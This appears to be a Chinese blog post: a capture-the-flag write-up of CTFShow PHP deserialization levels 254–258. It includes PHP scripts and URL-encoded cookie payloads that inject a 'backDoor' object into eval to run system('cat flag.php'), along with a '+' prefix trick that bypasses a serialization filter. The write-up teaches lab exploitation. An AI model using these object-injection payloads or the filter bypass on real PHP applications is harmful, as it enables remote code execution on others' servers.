@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>CTF-PHP反序列化 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="CTF-PHP反序列化" />
+<meta property="og:description" content="CTFSHOW-关卡254到258-原生类&amp;POP构造 CTF-254-对象引用执行逻辑 username=xxxxxx&amp;password=xxxxxx
+解题思路：触发vipOneKeyGetFlag这个方法，同时让方法中的判断为真才能获取flag。
+首先分析代码，查看下方判断，用两个GET方法接受账号密码，然后创建ctfShowUser这个类的对象，调用login这个方法，当该方法将isVip赋值为真时才能触发checkVip方法并返回为真，最后触发vipOneKeyGetFlag获取flag。
+可以从login方法入手，当$u和$p等于username和password时，isVip将赋值为true。然后执行checkVip方法返回为true时，最后触发vipOneKeyGetFlag获取flag。
+通过代码可以发现username和password的值为xxxxxx,那么直接传递账号密码为xxxxxx，底部直接获取flag
+CTF-255-反序列化变量修改 public $isVip=true; $a=new ctfShowUser(); echo urlencode(serialize($a)); Get:username=xxxxxx&amp;password=xxxxxx
+Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
+该关的源码与上关差距不大，但是在login方法中除了简单比较了一下username和password并没有将isVip改为true，那么在后面的checkVip方法中就无法返回true，无法在vipOneKeyGetFlag方法中获取flag
+思路：下方的$user接受的是反序列化，那么可以利用反序列化将isVip的值直接改为true
+利用网页工具 菜鸟php工具 将ctfShowUser这个类进行序列化并将isVip的值改为true，获取序列化字符串，使用urlencode编码防止赋值到网页时一些空格或其他数据造成的影响 查看源代码可知道反序列化是在cookie中的user里面的内容，那么访问页面利用burpsuite进行截断，并添加cookie和其中的user，将user值改为序列化字符串，再在url头部进行username和password的传输
+放出截断的代码获取flag。
+CTF-256-反序列化参数修改 public $username=&#39;x&#39;; public $password=&#39;y&#39;; public $isVip=true; $a=new ctfShowUser(); echo urlencode(serialize($a)); GET:username=x&amp;password=y
+COOKIE:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22x%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22y%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
+该关的考点非常清楚，在login和vipOneKeyGetFlag两个方法中$u和$p与username和password分别要全等，但是username和password不能全等。
+思路：依旧用上一关的办法并且修改掉$username和password$的值即可，然后在x和y中传递与username和password相同的值，那么即可绕过判断。
+依旧利用burp截断网页，利用url头传递参数并添加cookie CTF-257-反序列化参数修改&amp;对象调用逻辑 class ctfShowUser{ private $class; public function __construct(){ $this-&gt;class=new backDoor(); } } class backDoor{ private $code=&#39;system(&#34;cat f*&#34;);&#39;; } $b=new ctfShowUser(); echo serialize($b); GET：username=xxxxxx&amp;password=xxxxxx
+COOKIE：user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat&#43;f%2A%22%29%3B%22%3B%7D%7D
+思路：该关出现了多个类，难度已经偏中等左右。分析代码可以发现有个eval函数，该函数可以将字符串当做JS代码执行，那么就可以从该函数入手。观察代码可以发现__destruct函数调用getInfo这个方法，但是因为ctfShowUser类中的class为info，所以destruct函数指向的info类里的getInfo，那么第一步就是将construct的实例化对象值改为backDoor，使destruct方法调用backDoor这个类中的getInfo从而触发eval函数。在利用eval函数的特性执行hs代码获取falg。
+依旧利用网页工具对类进行序列化，将__construct方法的内容改为创建backDoor类的对象，当利用$a实例化ctfShowUser时就会触发__construct方法。根据源码当对象销毁时会执行destruct方法，调用backDoor中的getInfo方法，然后会执行方便eval函数，然后修改code值为JS代码让eval函数执行。
+因为这个知道了路径下有flag.php文件，所以直接写上。正常情况下需要利用ls查看当前目录。
+为了代码美观，无关的数据已经删掉，因为起不到作用。
+将反序列化字符串的url编码写入到cookie中并在get中传递参数，获取flag
+CTF-258-反序列化参数修改&amp;对象调用逻辑 &lt;?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/bb312a4fb6f6d257704753b156592fc5/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-18T16:27:04+08:00" />
+<meta property="article:modified_time" content="2022-10-18T16:27:04+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">CTF-PHP反序列化</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <h3 style="margin-left:0px;"><span style="color:#fe2c24;">CTFSHOW-关卡254到258-原生类&amp;POP构造</span></h3> 
+<p></p> 
+<h4><span style="color:#ff9900;">CTF-254-对象引用执行逻辑</span></h4> 
+<p style="margin-left:0;"><span style="color:#000000;">username</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">&amp;</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span></p> 
+<p style="margin-left:0;">解题思路：触发vipOneKeyGetFlag这个方法，同时让方法中的判断为真才能获取flag。</p> 
+<p style="margin-left:0;">首先分析代码，查看下方判断，用两个GET方法接受账号密码，然后创建ctfShowUser这个类的对象，调用login这个方法，当该方法将isVip赋值为真时才能触发checkVip方法并返回为真，最后触发vipOneKeyGetFlag获取flag。</p> 
+<p style="margin-left:0;"><img alt="" height="515" src="https://images2.imgbox.com/c3/14/thaxahsd_o.png" width="473"></p> 
+<p style="margin-left:0;">可以从login方法入手，当$u和$p等于username和password时，isVip将赋值为true。然后执行checkVip方法返回为true时，最后触发vipOneKeyGetFlag获取flag。</p> 
+<p style="margin-left:0;">通过代码可以发现username和password的值为xxxxxx,<span style="color:#000000;">那么直接传递账号密码为xxxxxx，底部直接获取flag</span></p> 
+<p style="margin-left:0;"></p> 
+<p style="margin-left:0;"><img alt="" height="163" src="https://images2.imgbox.com/86/40/qNBJ9DAQ_o.png" width="440"></p> 
+<p> <img alt="" height="38" src="https://images2.imgbox.com/15/64/0JhMloTQ_o.png" width="554"></p> 
+<p> </p> 
+<p> </p> 
+<h4><span style="color:#ff9900;">CTF-255-反序列化变量修改</span></h4> 
+<pre><code class="language-php">public $isVip=true;
+
+$a=new ctfShowUser();
+
+echo urlencode(serialize($a));</code></pre> 
+<p style="margin-left:0;"><span style="color:#000000;">Get</span><span style="color:#979797;">:</span><span style="color:#000000;">username</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">&amp;</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span></p> 
+<p style="margin-left:0;"><span style="color:#000000;">Cookie</span><span style="color:#979797;">:</span><span style="color:#000000;">user</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">O</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A11</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">ctfShowUser</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A3</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">username</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A6</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A6</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A5</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">isVip</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bb</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span></p> 
+<p style="margin-left:0;">该关的源码与上关差距不大，但是在login方法中除了简单比较了一下username和password并没有将isVip改为true，那么在后面的checkVip方法中就无法返回true，无法在vipOneKeyGetFlag方法中获取flag</p> 
+<p style="margin-left:0;">思路：下方的$user接受的是反序列化，那么可以利用反序列化将isVip的值直接改为true</p> 
+<p style="margin-left:0;"></p> 
+<p style="margin-left:0;"><img alt="" height="497" src="https://images2.imgbox.com/18/63/DBfVw36i_o.png" width="453"></p> 
+<p></p> 
+<p>利用网页工具 <a href="https://c.runoob.com/" rel="nofollow" title="菜鸟php工具">菜鸟php工具</a> 将ctfShowUser这个类进行序列化并将isVip的值改为true，获取序列化字符串，使用urlencode编码防止赋值到网页时一些空格或其他数据造成的影响 </p> 
+<p><img alt="" height="431" src="https://images2.imgbox.com/41/bf/6JzOJrVZ_o.png" width="1107"></p> 
+<p>查看源代码可知道反序列化是在cookie中的user里面的内容，那么访问页面利用burpsuite进行截断，并添加cookie和其中的user，将user值改为序列化字符串，再在url头部进行username和password的传输</p> 
+<p><img alt="" height="474" src="https://images2.imgbox.com/81/95/eCgMhnE9_o.png" width="727"> </p> 
+<p>放出截断的代码获取flag。</p> 
+<p><img alt="" height="314" src="https://images2.imgbox.com/ed/12/YvWFKbpw_o.png" width="867"> </p> 
+<p> </p> 
+<h4><span style="color:#ff9900;">CTF-256-反序列化参数修改</span></h4> 
+<pre><code class="language-php">public $username='x';
+
+public $password='y';
+
+public $isVip=true;
+
+$a=new ctfShowUser();
+
+echo urlencode(serialize($a));</code></pre> 
+<p style="margin-left:0;"><span style="color:#990055;">GET</span><span style="color:#979797;">:</span><span style="color:#000000;">username</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">x</span><span style="color:#9a6e3a;">&amp;</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">y</span></p> 
+<p style="margin-left:0;"><span style="color:#990055;">COOKIE</span><span style="color:#979797;">:</span><span style="color:#000000;">user</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">O</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A11</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">ctfShowUser</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A3</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">username</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">x</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">y</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A5</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">isVip</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bb</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span></p> 
+<p style="margin-left:0;">该关的考点非常清楚，在login和vipOneKeyGetFlag两个方法中$u和$p与username和password分别要全等，但是username和password不能全等。</p> 
+<p style="margin-left:0;">思路：依旧用上一关的办法并且修改掉$username和password$的值即可，然后在x和y中传递与username和password相同的值，那么即可绕过判断。</p> 
+<p style="margin-left:0;"><img alt="" height="609" src="https://images2.imgbox.com/f6/30/kBJu95vE_o.png" width="677"></p> 
+<p> <img alt="" height="468" src="https://images2.imgbox.com/b7/a7/NISOH2Yg_o.png" width="1086"></p> 
+<p></p> 
+<p>依旧利用burp截断网页，利用url头传递参数并添加cookie </p> 
+<p><img alt="" height="275" src="https://images2.imgbox.com/fd/c9/KqEzjWOx_o.png" width="845"> </p> 
+<p> </p> 
+<h4><span style="color:#ff9900;">CTF-257-反序列化参数修改&amp;对象调用逻辑</span></h4> 
+<pre><code class="language-php">
+class ctfShowUser{
+
+    private $class;
+
+    public function __construct(){
+
+        $this-&gt;class=new backDoor();
+
+    }
+
+}
+
+class backDoor{
+
+    private $code='system("cat f*");';
+
+}
+
+$b=new ctfShowUser();
+
+echo serialize($b);
+
+</code></pre> 
+<p style="margin-left:0;"><span style="color:#990055;">GET</span><span style="color:#000000;">：username</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">&amp;</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span></p> 
+<p style="margin-left:0;"><span style="color:#990055;">COOKIE</span><span style="color:#000000;">：user</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">O</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A11</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">ctfShowUser</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A18</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">00</span><span style="color:#000000;">ctfShowUser</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">00</span><span style="color:#000000;">class</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">BO</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">backDoor</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A14</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">00</span><span style="color:#000000;">backDoor</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">00</span><span style="color:#000000;">code</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A17</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">system</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">28</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">cat</span><span style="color:#9a6e3a;">+</span><span style="color:#000000;">f</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">2</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">29</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span></p> 
+<p style="margin-left:0;">思路：该关出现了多个类，难度已经偏中等左右。分析代码可以发现有个eval函数，该函数可以将字符串当做JS代码执行，那么就可以从该函数入手。观察代码可以发现__destruct函数调用getInfo这个方法，但是因为ctfShowUser类中的class为info，所以destruct函数指向的info类里的getInfo，那么第一步就是将construct的实例化对象值改为backDoor，使destruct方法调用backDoor这个类中的getInfo从而触发eval函数。在利用eval函数的特性执行hs代码获取falg。</p> 
+<p style="margin-left:0;"><img alt="" height="771" src="https://images2.imgbox.com/04/dc/Gdqb212e_o.png" width="560"></p> 
+<p style="margin-left:0;">依旧利用网页工具对类进行序列化，将__construct方法的内容改为创建backDoor类的对象，当利用$a实例化ctfShowUser时就会触发__construct方法。根据源码当对象销毁时会执行destruct方法，调用backDoor中的getInfo方法，然后会执行方便eval函数，然后修改code值为JS代码让eval函数执行。</p> 
+<p style="margin-left:0;">因为这个知道了路径下有flag.php文件，所以直接写上。正常情况下需要利用ls查看当前目录。</p> 
+<p style="margin-left:0;">为了代码美观，无关的数据已经删掉，因为起不到作用。</p> 
+<p style="margin-left:0;"><img alt="" height="531" src="https://images2.imgbox.com/2f/e9/PxxBWLTJ_o.png" width="1200"></p> 
+<p> </p> 
+<p style="margin-left:0;">将反序列化字符串的url编码写入到cookie中并在get中传递参数，获取flag</p> 
+<p style="margin-left:0;"><img alt="" height="542" src="https://images2.imgbox.com/7c/ae/VGIL6MAw_o.png" width="1029"></p> 
+<p> </p> 
+<p> </p> 
+<h4><span style="color:#ff9900;">CTF-258-反序列化参数修改&amp;对象调用逻辑 </span></h4> 
+<pre><code class="language-php">&lt;?php
+class ctfShowUser{
+    public $class = 'backDoor';
+    public function __construct(){
+        $this-&gt;class=new backDoor();
+    }
+}
+
+
+class backDoor{
+    public $code="system('cat flag.php');";
+}
+
+$a=serialize(new ctfShowUser());
+$b=str_replace(':11',':+11',$a);
+$c=str_replace(':8',':+8',$b);
+echo urlencode($c);
+?&gt;
+</code></pre> 
+<p style="margin-left:0;"><span style="color:#990055;">GET</span><span style="color:#000000;">：username</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span><span style="color:#9a6e3a;">&amp;</span><span style="color:#000000;">password</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xxxxxx</span></p> 
+<p style="margin-left:0;"><span style="color:#990055;">COOKIE</span><span style="color:#000000;">：user</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">O</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">2</span><span style="color:#000000;">B11</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">ctfShowUser</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A5</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">class</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">BO</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">2</span><span style="color:#000000;">B8</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">backDoor</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A1</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A4</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">code</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">Bs</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A23</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">A</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#000000;">system</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">28</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">27</span><span style="color:#000000;">cat</span><span style="color:#9a6e3a;">+</span><span style="color:#000000;">flag</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">php</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">27</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">29</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">22</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">3</span><span style="color:#000000;">B</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span><span style="color:#9a6e3a;">%</span><span style="color:#990055;">7</span><span style="color:#000000;">D</span></p> 
+<p style="margin-left:0;"><span style="color:#000000;">该关比上一关多可过滤字符，代表过滤oc开头后面带数字的数据，i代表不区分大小写，那么这个过滤导致序列化字符串生成的url编码无法使用</span></p> 
+<p style="margin-left:0;"><img alt="" height="646" src="https://images2.imgbox.com/14/bd/Mt4i13tR_o.png" width="565"></p> 
+<p><span style="color:#000000;">可以看到右边的数据就是序列化之后的数据，字母O后面带有数字所以被过滤，那么将字母o后面的数字11改为+11，数字8改为+8，不仅数值没有变，因为字母后面跟的不是纯数字，所以可以绕过过滤</span></p> 
+<p><img alt="" height="344" src="https://images2.imgbox.com/bc/71/4NqVLUWZ_o.png" width="1160"> </p> 
+<p style="margin-left:0;"></p> 
+<p style="margin-left:0;"><span style="color:#000000;">str_place为php中的替代函数，第一个参数为要替换的数据，第二个参数为替换之后的数据，第三个参数是要替换的字符串。</span></p> 
+<p style="margin-left:0;"><span style="color:#000000;">注意：一定要序列化之后进行替换，在进行url编码，因为源码中过滤的序列化字符串并不是url编码数据</span></p> 
+<p><img alt="" height="409" src="https://images2.imgbox.com/eb/7e/sfuNddfi_o.png" width="1200"></p> 
+<p> <img alt="" height="553" src="https://images2.imgbox.com/c7/b3/Z8Pt4JyH_o.png" width="1200"></p> 
+<p> </p> 
+<p> </p> 
+<p></p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/c7c010930d700ee85d383fba977d15b2/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">微信小程序页面跳转方式&#43;跳转小程序（直接复制代码可用）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/f3383b769739956167a9ade448181632/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">值得关注的5款“企业级低代码开发平台”推荐</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
